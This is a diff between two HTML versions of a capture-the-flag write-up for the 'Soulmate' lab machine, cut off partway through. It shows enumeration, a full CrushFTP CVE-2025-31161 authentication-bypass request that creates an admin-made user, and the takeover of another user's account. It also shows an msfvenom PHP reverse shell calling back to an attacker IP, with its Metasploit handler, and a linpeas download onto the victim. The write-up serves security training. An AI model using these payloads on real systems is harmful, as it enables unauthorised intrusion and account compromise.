 Nmap scan report for soulmate.htb (10.10.11.86)
 Host is up (0.26s latency).
 Not shown: 998 closed tcp ports (reset)
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
+| ssh-hostkey: 
 |   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
 |_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
 80/tcp open  http    nginx 1.18.0 (Ubuntu)
 |_http-server-header: nginx/1.18.0 (Ubuntu)
-| http-cookie-flags:
-|   /:
-|     PHPSESSID:
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
 |_      httponly flag not set
-|_http-title: Soulmate - Find Your Perfect Match
-Device type: general purpose|router
-Running: Linux 5.X, MikroTik RouterOS 7.X
-OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
-OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
-Network Distance: 2 hops
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+|_http-title: Soulmate - Find Your Perfect Match</code></pre>
 
-TRACEROUTE (using port 1720/tcp)
-HOP RTT       ADDRESS
-1   270.61 ms 10.10.14.1
-2   270.75 ms soulmate.htb (10.10.11.86)
+                    <p><strong>Open Ports:</strong></p>
+                    <ul>
+                        <li><strong>SSH (22/tcp)</strong> - OpenSSH 8.9p1 Ubuntu 3ubuntu0.13</li>
+                        <li><strong>HTTP (80/tcp)</strong> - nginx 1.18.0 (Ubuntu)</li>
+                    </ul>
 
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 22.53 seconds</code></pre><p id="269e36ec-aa11-8002-a6ec-c91eedad8926" class=""><strong>Open Ports:</strong></p><ul id="269e36ec-aa11-802e-84c9-f1a5327dde37" class="bulleted-list"><li style="list-style-type:disc"><strong>SSH (22/tcp)</strong> - OpenSSH 8.9p1 Ubuntu 3ubuntu0.13</li></ul><ul id="269e36ec-aa11-806f-90ea-c8ea79c4fab7" class="bulleted-list"><li style="list-style-type:disc"><strong>HTTP (80/tcp)</strong> - nginx 1.18.0 (Ubuntu)</li></ul><p id="269e36ec-aa11-80a9-855c-c7d02024ee0b" class=""><strong>Attack Surface:</strong></p><ul id="269e36ec-aa11-800e-96a2-f60573824c21" class="bulleted-list"><li style="list-style-type:disc">Web application on port 80 running PHP (evidenced by PHPSESSID cookie)</li></ul><ul id="269e36ec-aa11-80a5-ada8-f8ef377d0ee0" class="bulleted-list"><li style="list-style-type:disc">SSH service for potential credential attacks or privilege escalation</li></ul><ul id="269e36ec-aa11-80a3-af69-c74e69030b1a" class="bulleted-list"><li style="list-style-type:disc">The missing httponly flag on session cookies suggests potential client-side security weaknesses</li></ul><h3 id="269e36ec-aa11-80a8-bda0-c9a8a5aeb9ce" class="">Website enumeration</h3><p id="269e36ec-aa11-80c0-ba96-fe0bf8ff488c" class="">I attempted to access the website soulmate.htb</p><p id="269e36ec-aa11-803b-89dc-edc0684712dc" class=""><strong>Mainpage</strong></p><figure id="269e36ec-aa11-80ad-bcb7-dcd90a1747eb" class="image"><a href="image.png"><img style="width:3155px" src="image.png"/></a></figure><p id="269e36ec-aa11-80e3-b536-d6c8858dac24" class=""><strong>#about</strong></p><figure id="269e36ec-aa11-8072-bbec-f1241f50b02c" class="image"><a href="image%201.png"><img style="width:681.9896240234375px" src="image%201.png"/></a></figure><p id="269e36ec-aa11-8082-9057-fe2a924c5bb3" class="">Found their email address which might be important: <code>hello@soulmate.htb</code></p><p id="269e36ec-aa11-80fd-80ba-c18da4ef0f52" class="">Let&#x27;s sign up and signin and see what interesting features we can find.</p><figure id="269e36ec-aa11-8026-8125-da00f55866c1" class="image"><a href="image%202.png"><img style="width:681.9896240234375px" src="image%202.png"/></a></figure><p id="269e36ec-aa11-801b-8eab-ddc0c1af0a68" class="">Hm… Profile page</p><figure id="269e36ec-aa11-80ab-b667-e88700ba060a" class="image"><a href="image%203.png"><img style="width:681.9896240234375px" src="image%203.png"/></a></figure><p id="269e36ec-aa11-808f-923a-fe1c20b8cbda" class="">I can edit my profile and upload an image. I tried to test if it can be exploited via file upload, but no bueno.</p><h3 id="269e36ec-aa11-804f-a967-d48dc106af8a" class="">DNS Enumeration</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="269e36ec-aa11-80ba-8c58-e1a40bffeae2" class="code code-wrap"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">└─# gobuster vhost -u http://soulmate.htb -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt --append-domain -t 100
-===============================================================
+                    <p><strong>Attack Surface:</strong></p>
+                    <ul>
+                        <li>Web application on port 80 running PHP (evidenced by PHPSESSID cookie)</li>
+                        <li>SSH service for potential credential attacks or privilege escalation</li>
+                        <li>The missing httponly flag on session cookies suggests potential client-side security weaknesses</li>
+                    </ul>
+
+                    <h3>Website enumeration</h3>
+                    <p>I attempted to access the website soulmate.htb</p>
+                    
+                    <p><strong>Mainpage</strong></p>
+                    <img src="image.png" alt="Soulmate homepage showing a dating application interface">
+
+                    <p><strong>#about</strong></p>
+                    <img src="image 1.png" alt="About section showing hello@soulmate.htb email address">
+
+                    <p>Found their email address which might be important: <code>hello@soulmate.htb</code></p>
+
+                    <p>Let's sign up and signin and see what interesting features we can find.</p>
+
+                    <img src="image 2.png" alt="User registration and login interface">
+
+                    <p>Hm… Profile page</p>
+
+                    <img src="image 3.png" alt="Profile page with image upload functionality">
+
+                    <p>I can edit my profile and upload an image. I tried to test if it can be exploited via file upload, but no bueno.</p>
+
+                    <h3>DNS Enumeration</h3>
+                    
+                    <pre><code class="language-bash">gobuster vhost -u http://soulmate.htb -w /usr/share/seclists/Discovery/DNS/combined_subdomains.txt --append-domain -t 100</code></pre>
+
+                    <pre><code class="language-text">===============================================================
 Gobuster v3.6
-by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 ===============================================================
 [+] Url:             http://soulmate.htb
 [+] Method:          GET
@@ -731,120 +496,174 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 ===============================================================
 Starting gobuster in VHOST enumeration mode
 ===============================================================
-Found: ftp.soulmate.htb Status: 302 [Size: 0] [--&gt; /WebInterface/login.html]
+Found: ftp.soulmate.htb Status: 302 [Size: 0] [-> /WebInterface/login.html]
 Progress: 653920 / 653921 (100.00%)
 ===============================================================
 Finished
-===============================================================</code></pre><p id="269e36ec-aa11-80db-9f6a-f5b37d9f1752" class="">After running gobuster to find subdomains, I discovered ftp.soulmate.htb. Now add it to <code>/etc/hosts</code></p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="269e36ec-aa11-8039-b957-c1ddc6318a8b" class="code code-wrap"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">echo &quot;10.10.11.86 ftp.soulmate.htb&quot; | sudo tee -a /etc/hosts</code></pre><h3 id="269e36ec-aa11-8049-87c2-e99c5492d029" class="">CrushFTP CVE -2025-31161 Discovery</h3><p id="269e36ec-aa11-80e5-b91d-d052d06a5fa3" class="">Let&#x27;s access <code><a href="http://ftp.soulmate.htb/WebInterface/login.html">http://ftp.soulmate.htb</a></code>! → It redirected me to <code><a href="http://ftp.soulmate.htb/WebInterface/login.h">http://ftp.soulmate.htb/WebInterface/login.h</a></code><code><a href="http://ftp.soulmate.htb/WebInterface/login.html">tml</a></code></p><figure id="269e36ec-aa11-8085-bcec-c23eda171191" class="image"><a href="image%204.png"><img style="width:3148px" src="image%204.png"/></a></figure><p id="269e36ec-aa11-80e7-b60f-d17c2292c413" class="">When encountering an unfamiliar technology or unusual web interface, the next logical step is to search for potential CVEs.</p><figure id="269e36ec-aa11-80e1-af61-ce65e2ee650b" class="image"><a href="image%205.png"><img style="width:681.9896240234375px" src="image%205.png"/></a></figure><p id="269e36ec-aa11-8076-b80e-d814dd962a4a" class="">
-</p></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">User 🙍🏻‍♂️</summary><div class="indented"><p id="269e36ec-aa11-8012-b60f-ddb14a97c8e3" class="">The vulnerability exists in the S3 authorization header processing logic within CrushFTP. Due to logic bugs in the underlying source code, a simple HTTP request with specific headers can bypass authentication without requiring valid credentials.</p><h3 id="269e36ec-aa11-80b4-8eb8-dc853d3e8243" class="">Exploitation ⚡</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="269e36ec-aa11-8068-a8fe-c56015672642" class="code code-wrap"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">POST /WebInterface/function/ HTTP/1.1
+===============================================================</code></pre>
+
+                    <p>After running gobuster to find subdomains, I discovered ftp.soulmate.htb. Now add it to <code>/etc/hosts</code></p>
+
+                    <pre><code class="language-bash">echo "10.10.11.86 ftp.soulmate.htb" | sudo tee -a /etc/hosts</code></pre>
+
+                    <h3>CrushFTP CVE-2025-31161 Discovery</h3>
+                    <p>Let's access <code>http://ftp.soulmate.htb</code>! → It redirected me to <code>http://ftp.soulmate.htb/WebInterface/login.html</code></p>
+
+                    <img src="image 4.png" alt="CrushFTP web interface login page">
+
+                    <p>When encountering an unfamiliar technology or unusual web interface, the next logical step is to search for potential CVEs.</p>
+
+                    <img src="image 5.png" alt="CVE research results showing CrushFTP vulnerability details">
+                </div>
+            </details>
+
+            <details open>
+                <summary>User 🙍🏻‍♂️</summary>
+                <div class="indented">
+                    <p>The vulnerability exists in the S3 authorization header processing logic within CrushFTP. Due to logic bugs in the underlying source code, a simple HTTP request with specific headers can bypass authentication without requiring valid credentials.</p>
+
+                    <h3>Exploitation ⚡</h3>
+
+                    <pre><code class="language-http">POST /WebInterface/function/ HTTP/1.1
 Host: ftp.soulmate.htb
 Cookie: currentAuth=31If; CrushAuth=1744110584619_p38s3LvsGAfk4GvVu0vWtsEQEv31If
 Authorization: AWS4-HMAC-SHA256 Credential=crushadmin/
 Connection: close
 Content-Type: application/x-www-form-urlencoded
 
-command=setUserItem&amp;data_action=replace&amp;serverGroup=MainUsers&amp;username=test&amp;user=&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;user type=&quot;properties&quot;&gt;&lt;user_name&gt;test&lt;/user_name&gt;&lt;password&gt;pass&lt;/password&gt;&lt;extra_vfs type=&quot;vector&quot;&gt;&lt;/extra_vfs&gt;&lt;version&gt;1.0&lt;/version&gt;&lt;root_dir&gt;/&lt;/root_dir&gt;&lt;userVersion&gt;6&lt;/userVersion&gt;&lt;max_logins&gt;0&lt;/max_logins&gt;&lt;site&gt;(SITE_PASS)(SITE_DOT)(SITE_EMAILPASSWORD)(CONNECT)&lt;/site&gt;&lt;created_by_username&gt;crushadmin&lt;/created_by_username&gt;&lt;created_by_email&gt;&lt;/created_by_email&gt;&lt;created_time&gt;1744120753370&lt;/created_time&gt;&lt;password_history&gt;&lt;/password_history&gt;&lt;/user&gt;&amp;xmlItem=user&amp;vfs_items=&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;vfs type=&quot;vector&quot;&gt;&lt;/vfs&gt;&amp;permissions=&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;VFS type=&quot;properties&quot;&gt;&lt;item name=&quot;/&quot;&gt;(read)(view)(resume)&lt;/item&gt;&lt;/VFS&gt;&amp;c2f=31If</code></pre><p id="269e36ec-aa11-80c4-bc4b-f5c86368855b" class="">POST user creation request got <strong>HTTP 200 OK </strong><code>&lt;user_name&gt;test&lt;/user_name&gt;&lt;password&gt;pass&lt;/password&gt;</code></p><figure id="269e36ec-aa11-809d-91fd-cf0e02288ebe" class="image"><a href="image%206.png"><img style="width:682px" src="image%206.png"/></a></figure><p id="269e36ec-aa11-8028-8679-fa05da9c1e5f" class="">Now, we can try to login <code>test:pass</code> ! LFG 🥳</p><figure id="269e36ec-aa11-800a-a598-e318d9fa50d5" class="image"><a href="image%207.png"><img style="width:3815px" src="image%207.png"/></a></figure><p id="269e36ec-aa11-8073-b5c6-da7e69b61d44" class="">Let’s f**k around until we can get initial access</p><p id="269e36ec-aa11-805a-93e1-c9192e625e0d" class=""><strong>admin site</strong></p><figure id="269e36ec-aa11-803e-92c6-f4924e65c8cf" class="image"><a href="image%208.png"><img style="width:2546px" src="image%208.png"/></a></figure><p id="269e36ec-aa11-80fe-b34f-f2a8dd84f159" class="">I can see other users in <code><a href="http://ftp.soulmate.htb/WebInterface/UserManager/index.html">http://ftp.soulmate.htb/WebInterface/UserManager/index.html</a></code></p><ul id="269e36ec-aa11-80e2-9cbb-f90e18c148da" class="bulleted-list"><li style="list-style-type:disc">crushadmin</li></ul><ul id="269e36ec-aa11-809e-bf50-d398942a5d1a" class="bulleted-list"><li style="list-style-type:disc">default</li></ul><ul id="269e36ec-aa11-800e-bf09-ffa2ef86a726" class="bulleted-list"><li style="list-style-type:disc">jenna</li></ul><ul id="269e36ec-aa11-80f2-957b-fec3530a4a6d" class="bulleted-list"><li style="list-style-type:disc">ben</li></ul><ul id="269e36ec-aa11-80ff-b448-df82d2721b96" class="bulleted-list"><li style="list-style-type:disc">TempAccount</li></ul><figure id="269e36ec-aa11-80e5-8ee9-c3056eab8adb" class="image"><a href="image%209.png"><img style="width:2118px" src="image%209.png"/></a></figure><p id="269e36ec-aa11-803f-9644-ef6ea532067d" class="">However, I can only access three directories: ben, IT, and webProd.</p><h3 id="269e36ec-aa11-80ec-869b-e89d39e0ce84" class=""><strong>Login as Ben</strong></h3><p id="269e36ec-aa11-8035-b592-de08a6ac8e7a" class="">Changed Ben&#x27;s password and login</p><figure id="269e36ec-aa11-805f-a161-fd90836dd317" class="image"><a href="image%2010.png"><img style="width:3817px" src="image%2010.png"/></a></figure><p id="269e36ec-aa11-80ff-a799-c00238329888" class="">Since the website is using PHP as its programming language, we can try to craft a malicious PHP file to get a reverse shell back to Metasploit.</p><figure id="269e36ec-aa11-808e-9394-fa54184ee9ac" class="image"><a href="image%2011.png"><img style="width:681.9896240234375px" src="image%2011.png"/></a></figure><p id="26ae36ec-aa11-8086-a1f4-ec28a93333ef" class="">Generate revershell php shell</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="26ae36ec-aa11-80b0-811b-f01e6a056ace" class="code code-wrap"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">└─# msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.17 LPORT=3000 -f raw -o shell.php
-[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
-[-] No arch selected, selecting arch: php from the payload
-No encoder specified, outputting raw payload
-Payload size: 34924 bytes
-Saved as: shell.php</code></pre><p id="26ae36ec-aa11-8032-902e-f63c2462fd55" class="">We start a listener on msfconsole</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="26ae36ec-aa11-80f4-960f-df3aae2c346b" class="code code-wrap"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">└─# msfconsole
-Metasploit tip: Tired of setting RHOSTS for modules? Try globally setting it
-with setg RHOSTS x.x.x.x
+command=setUserItem&data_action=replace&serverGroup=MainUsers&username=test&user=<?xml version="1.0" encoding="UTF-8"?><user type="properties"><user_name>test</user_name><password>pass</password><extra_vfs type="vector"></extra_vfs><version>1.0</version><root_dir>/</root_dir><userVersion>6</userVersion><max_logins>0</max_logins><site>(SITE_PASS)(SITE_DOT)(SITE_EMAILPASSWORD)(CONNECT)</site><created_by_username>crushadmin</created_by_username><created_by_email></created_by_email><created_time>1744120753370</created_time><password_history></password_history></user>&xmlItem=user&vfs_items=<?xml version="1.0" encoding="UTF-8"?><vfs type="vector"></vfs>&permissions=<?xml version="1.0" encoding="UTF-8"?><VFS type="properties"><item name="/">(read)(view)(resume)</item></VFS>&c2f=31If</code></pre>
 
+                    <p>POST user creation request got <strong>HTTP 200 OK</strong> <code>&lt;user_name&gt;test&lt;/user_name&gt;&lt;password&gt;pass&lt;/password&gt;</code></p>
 
-         .                                         .
- .
+                    <img src="image 6.png" alt="Successful user creation response">
 
-      dBBBBBBb  dBBBP dBBBBBBP dBBBBBb  .                       o
-       &#x27;   dB&#x27;                     BBP
-    dB&#x27;dB&#x27;dB&#x27; dBBP     dBP     dBP BB
-   dB&#x27;dB&#x27;dB&#x27; dBP      dBP     dBP  BB
-  dB&#x27;dB&#x27;dB&#x27; dBBBBP   dBP     dBBBBBBB
+                    <p>Now, we can try to login <code>test:pass</code> ! LFG 🥳</p>
 
-                                   dBBBBBP  dBBBBBb  dBP    dBBBBP dBP dBBBBBBP
-          .                  .                  dB&#x27; dBP    dB&#x27;.BP
-                             |       dBP    dBBBB&#x27; dBP    dB&#x27;.BP dBP    dBP
-                           --o--    dBP    dBP    dBP    dB&#x27;.BP dBP    dBP
-                             |     dBBBBP dBP    dBBBBP dBBBBP dBP    dBP
+                    <img src="image 7.png" alt="Successful login to CrushFTP interface">
 
-                                                                    .
-                .
-        o                  To boldly go where no
-                            shell has gone before
+                    <p>Let's f**k around until we can get initial access</p>
 
+                    <p><strong>admin site</strong></p>
 
-       =[ metasploit v6.4.69-dev                          ]
-+ -- --=[ 2529 exploits - 1302 auxiliary - 431 post       ]
-+ -- --=[ 1669 payloads - 49 encoders - 13 nops           ]
-+ -- --=[ 9 evasion                                       ]
+                    <img src="image 8.png" alt="CrushFTP admin interface showing user management">
 
-Metasploit Documentation: https://docs.metasploit.com/
+                    <p>I can see other users in <code>http://ftp.soulmate.htb/WebInterface/UserManager/index.html</code></p>
+                    <ul>
+                        <li>crushadmin</li>
+                        <li>default</li>
+                        <li>jenna</li>
+                        <li>ben</li>
+                        <li>TempAccount</li>
+                    </ul>
 
-msf6 &gt; use exploit/multi/handler
-[*] Using configured payload generic/shell_reverse_tcp
-msf6 exploit(multi/handler) &gt; set payload php/meterpreter_reverse_tcp
-payload =&gt; php/meterpreter_reverse_tcp
-msf6 exploit(multi/handler) &gt; set LHOST 10.10.14.17
-LHOST =&gt; 10.10.14.17
-msf6 exploit(multi/handler) &gt; set LPORT 3000
-LPORT =&gt; 3000
-msf6 exploit(multi/handler) &gt; run
-[*] Started reverse TCP handler on 10.10.14.17:3000</code></pre><p id="269e36ec-aa11-8075-b968-e0acf5909a3e" class="">We then upload the <code>shell.php</code> to webProd, since it is where <strong>the web server&#x27;s document root is located</strong>, making uploaded files directly accessible via HTTP requests.<br/>Upload <strong>shell.php</strong></p><figure id="26ae36ec-aa11-802f-9db3-c5fe0a4a7048" class="image"><a href="image%2012.png"><img style="width:2704px" src="image%2012.png"/></a></figure><p id="26ae36ec-aa11-802f-a403-fb9fc5b5d175" class="">Trigger the shell.php to get the shell by accessing <code><a href="http://soulmate.htb/shell.php">http://soulmate.htb/shell.php</a></code></p><figure id="26ae36ec-aa11-803e-893e-f50a2b0025f0" class="image"><a href="image%2013.png"><img style="width:2437px" src="image%2013.png"/></a></figure><figure id="26ae36ec-aa11-8012-826a-e45264766c9b" class="image"><a href="image%2014.png"><img style="width:682px" src="image%2014.png"/></a></figure><p id="26ae36ec-aa11-8023-96c9-e435158488aa" class="">I cannot go to Ben&#x27;s directory. I have to find another way to climb my way up to Ben&#x27;s privileges</p><p id="26ae36ec-aa11-8064-8a58-f2ea6efe07aa" class="">I am a lazy guy so I&#x27;m just gonna run linpeas until I find vulnerabilities</p><p id="26ae36ec-aa11-80b7-aeec-d7596ad4ce32" class="">Start an HTTP server to upload linpeas, as I cannot download files directly onto the victim machine</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="26ae36ec-aa11-80f9-aa24-c6578d1f322e" class="code code-wrap"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">└─# python3 -m http.server 8000
-Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-10.10.11.86 - - [10/Sep/2025 10:54:27] &quot;GET /linpeas.sh HTTP/1.1&quot; 200</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="26ae36ec-aa11-80a2-b85b-fa0039bd944b" class="code code-wrap"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">wget http://10.10.14.17:8000/linpeas.sh -O /tmp/linpeas.sh
-chmod +x /tmp/linpeas.sh</code></pre><figure id="26ae36ec-aa11-8041-8e4f-e3d9ee024ac9" class="image"><a href="image%2015.png"><img style="width:681.9896240234375px" src="image%2015.png"/></a></figure><p id="26ae36ec-aa11-8024-a0e0-ddb38e1a36d1" class="">Based on <a href="http://linpeas.sh">linpeas.sh</a>, we found an Erlang script <code>start.escript</code> that exposed Ben&#x27;s credentials!!!</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="26ae36ec-aa11-80ea-a555-f4d5001cb84f" class="code code-wrap"><code class="language-PowerShell" style="white-space:pre-wrap;word-break:break-all">cat /usr/local/lib/erlang_login/start.escript
+                    <img src="image 9.png" alt="File system view showing accessible directories">
+
+                    <p>However, I can only access three directories: ben, IT, and webProd.</p>
+
+                    <h3><strong>Login as Ben</strong></h3>
+                    <p>Changed Ben's password and login</p>
+
+                    <img src="image 10.png" alt="Changing Ben's password in user management">
+
+                    <p>Since the website is using PHP as its programming language, we can try to craft a malicious PHP file to get a reverse shell back to Metasploit.</p>
+
+                    <img src="image 11.png" alt="Ben's file access showing webProd directory">
+
+                    <p>Generate revershell php shell</p>
+
+                    <pre><code class="language-bash">msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.17 LPORT=3000 -f raw -o shell.php</code></pre>
+
+                    <p>We start a listener on msfconsole</p>
+
+                    <pre><code class="language-bash">msfconsole
+use exploit/multi/handler
+set payload php/meterpreter_reverse_tcp
+set LHOST 10.10.14.17
+set LPORT 3000
+run</code></pre>
+
+                    <p>We then upload the <code>shell.php</code> to webProd, since it is where <strong>the web server's document root is located</strong>, making uploaded files directly accessible via HTTP requests.<br/>Upload <strong>shell.php</strong></p>
+
+                    <img src="image 12.png" alt="Uploading shell.php to webProd directory">
+
+                    <p>Trigger the shell.php to get the shell by accessing <code>http://soulmate.htb/shell.php</code></p>
+
+                    <img src="image 13.png" alt="Successful meterpreter shell connection">
+
+                    <img src="image 14.png" alt="Meterpreter session details">
+
+                    <p>I cannot go to Ben's directory. I have to find another way to climb my way up to Ben's privileges</p>
+
+                    <p>I am a lazy guy so I'm just gonna run linpeas until I find vulnerabilities</p>
+
+                    <p>Start an HTTP server to upload linpeas, as I cannot download files directly onto the victim machine</p>
+
+                    <pre><code class="language-bash">python3 -m http.server 8000</code></pre>
+
+                    <pre><code class="language-bash">wget http://10.10.14.17:8000/linpeas.sh -O /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh</code></pre>
+
+                    <img src="image 15.png" alt="Linpeas output highlighting interesting files">
+
+                    <p>Based on linpeas.sh, we found an Erlang script <code>start.escript</code> that exposed Ben's credentials!!!</p>
+
+                    <pre><code class="language-erlang">cat /usr/local/lib/erlang_login/start.escript
 #!/usr/bin/env escript
 %%! -sname ssh_runner
 
-main(_) -&gt;
+main(_) ->
     application:start(asn1),
     application:start(crypto),
     application:start(public_key),
     application:start(ssh),
 
-    io:format(&quot;Starting SSH daemon with logging...~n&quot;),
+    io:format("Starting SSH daemon with logging...~n"),
 
     case ssh:daemon(2222, [
         {ip, {127,0,0,1}},
-        {system_dir, &quot;/etc/ssh&quot;},
+        {system_dir, "/etc/ssh"},
 
-        {user_dir_fun, fun(User) -&gt;
-            Dir = filename:join(&quot;/home&quot;, User),
-            io:format(&quot;Resolving user_dir for ~p: ~s/.ssh~n&quot;, [User, Dir]),
-            filename:join(Dir, &quot;.ssh&quot;)
+        {user_dir_fun, fun(User) ->
+            Dir = filename:join("/home", User),
+            io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]),
+            filename:join(Dir, ".ssh")
         end},
 
-        {connectfun, fun(User, PeerAddr, Method) -&gt;
-            io:format(&quot;Auth success for user: ~p from ~p via ~p~n&quot;,
+        {connectfun, fun(User, PeerAddr, Method) ->
+            io:format("Auth success for user: ~p from ~p via ~p~n",
                       [User, PeerAddr, Method]),
             true
         end},
 
-        {failfun, fun(User, PeerAddr, Reason) -&gt;
-            io:format(&quot;Auth failed for user: ~p from ~p, reason: ~p~n&quot;,
+        {failfun, fun(User, PeerAddr, Reason) ->
+            io:format("Auth failed for user: ~p from ~p, reason: ~p~n",
                       [User, PeerAddr, Reason]),
             true
         end},
 
-        {auth_methods, &quot;publickey,password&quot;},
